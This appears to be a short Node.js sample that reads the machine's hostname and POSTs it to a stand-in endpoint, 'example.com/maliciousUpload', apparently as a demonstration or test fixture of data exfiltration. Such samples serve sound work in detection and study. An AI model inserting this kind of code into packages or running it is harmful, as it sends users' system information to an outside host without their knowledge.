const os = require('os')

const hostname = os.hostname()
console.log('Hostname:', hostname)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { hostname }
  }
)
